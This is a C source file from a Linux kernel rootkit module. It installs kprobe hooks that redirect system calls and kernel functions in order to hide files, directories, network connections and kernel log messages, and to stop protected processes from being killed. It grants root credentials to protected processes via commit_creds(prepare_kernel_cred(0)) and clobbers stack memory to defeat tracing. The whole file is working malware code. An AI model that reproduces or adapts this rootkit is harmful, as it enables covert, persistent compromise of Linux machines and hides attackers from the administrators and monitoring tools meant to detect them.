#include "inc/hooks.h"
#include "inc/cmds.h"
#include "inc/util.h"

#include <linux/kprobes.h>
#include <linux/module.h>

struct hook {
  void         *func; // hook function
  struct kprobe kp;   // kprobe hook
};

struct hook hooks[] = {
    // used to hide network connections of protected processes (from /proc/net)
    {.func = h_tcp4_seq_show,  .kp = {.symbol_name = "tcp4_seq_show"}       },
    {.func = h_tcp6_seq_show,  .kp = {.symbol_name = "tcp6_seq_show"}       },
    {.func = h_udp4_seq_show,  .kp = {.symbol_name = "udp4_seq_show"}       },
    {.func = h_udp6_seq_show,  .kp = {.symbol_name = "udp6_seq_show"}       },

    // used to prevent killing proctected processes
    {.func = h_kill,           .kp = {.symbol_name = "__x64_sys_kill"}      },

    // used to hide files/dirs from directory listings
    {.func = h_getdents64,     .kp = {.symbol_name = "__x64_sys_getdents64"}},
    {.func = h_getdents,       .kp = {.symbol_name = "__x64_sys_getdents"}  },

    // used to prevent getting info about hidden files/dirs
    {.func = h_stat,           .kp = {.symbol_name = "__x64_sys_stat"}      },
    {.func = h_lstat,          .kp = {.symbol_name = "__x64_sys_lstat"}     },
    {.func = h_fstat,          .kp = {.symbol_name = "__x64_sys_fstat"}     },
    {.func = h_statx,          .kp = {.symbol_name = "__x64_sys_statx"}     },
    {.func = h_newfstatat,     .kp = {.symbol_name = "__x64_sys_newfstatat"}},

    // used to prevent changing directory to hidden dirs
    {.func = h_chdir,          .kp = {.symbol_name = "__x64_sys_chdir"}     },
    {.func = h_fchdir,         .kp = {.symbol_name = "__x64_sys_fchdir"}    },

    // used to prevent deleting hidden files/dirs
    {.func = h_unlink,         .kp = {.symbol_name = "__x64_sys_unlink"}    },
    {.func = h_unlinkat,       .kp = {.symbol_name = "__x64_sys_unlinkat"}  },

    // used to prevent linking files/dirs with hidden files/dirs
    {.func = h_link,           .kp = {.symbol_name = "__x64_sys_link"}      },
    {.func = h_linkat,         .kp = {.symbol_name = "__x64_sys_linkat"}    },
    {.func = h_symlink,        .kp = {.symbol_name = "__x64_sys_symlink"}   },
    {.func = h_symlinkat,      .kp = {.symbol_name = "__x64_sys_symlinkat"} },

    // used prevent opening hidden files/dirs
    {.func = h_do_sys_openat2, .kp = {.symbol_name = "do_sys_openat2"}      },

    // used to hide ring buffer messages related to the module
    {.func = h_devkmsg_read,   .kp = {.symbol_name = "devkmsg_read"}        },
};

#define hook_count() (sizeof(hooks) / sizeof(hooks[0]))

int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
  uint8_t i = 0;

  // if the processes is protected, then it's trusted and we can ignore the hooks
  if (is_process_protected(current->pid)) {
    // u dont have root? nah i got u bud
    if (current->cred->uid.val != 0 || current->cred->gid.val != 0)
      commit_creds(prepare_kernel_cred(0));
    return 0;
  }

  // clang-format off

  /*

   * here is the problem: if we hook a function and call our hook function instead,
   * when the hook function calls the original function, the kprobe will
   * be triggered again, so we will trigger our hook again, which will trigger the
   * kprobe again... so an infinite loop, we will just hang the current task

   * to prevent this, the hooked function sets the r15 register to a special value
   * which is used verify that the caller is actually our hook function

   * in this case we'll just singlestep the original hooked function, preventing the loop

  */

  // clang-format on

  if (r->r15 == SHRK_MAGIC_R15)
    return 0;

  for (; i < hook_count(); i++) {
    if (kp == &hooks[i].kp) {

      // clang-format off

      /*

       * redirect execution to the hooked call (by modifying the instruction pointer)
       * see Documentation/trace/kprobes.rst for more info

       * Changing Execution Path
       * -----------------------
       * ...
       * If you change the instruction pointer (and set up other related registers) in pre_handler,
       * you must return !0 so that kprobes stops single stepping and just returns to the given address.
       * This also means post_handler should not be called anymore.

      */

      // clang-format on

      r->ip = (uint64_t)hooks[i].func;
      return 1;
    }
  }

  return 0;
}

bool hooks_install(void) {
  struct hook *h = NULL;
  uint8_t      i = 0;

  // register all the hooks
  for (; i < hook_count(); i++) {
    h                 = &hooks[i];
    h->kp.pre_handler = __hook_pre_handler;

    if (register_kprobe(&h->kp) != 0) {
      debg("failed to register kprobe for %s", h->kp.symbol_name);
      continue;
    }

    debg("hooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->kp.addr, h->func);
  }

  return true;
}

void hooks_uninstall(void) {
  struct hook *h = NULL;
  uint8_t      i = 0;

  for (; i < hook_count(); i++) {
    h = &hooks[i];

    debg("unhooked %s (0x%px => 0x%px)", h->kp.symbol_name, h->func, h->kp.addr);
    unregister_kprobe(&h->kp);
  }
}

void *hooks_find(const char *symbol) {
  uint8_t i = 0;

  for (; i < hook_count(); i++) {
    if (strcmp(hooks[i].kp.symbol_name, symbol) == 0)
      return hooks[i].kp.addr;
  }

  // if we cant find the original function we can just panic in debug mode
  if (SHRK_DEBUG)
    panic("original call not found for %s", symbol);

  /*

   * otherwise lets fuck the stack to make sure functions doesnt get traced back
   * which most likely will cause overflow panic bc of canary

  */
  else {
    void *rbp = NULL;

    asm("mov %%rax, %%rbp;"
        "mov %0, %%rax;"
        : "=rm"(rbp)
        :
        : "%rax");

    memset(rbp, 0, 8 * 1000);
  }

  return NULL;
}
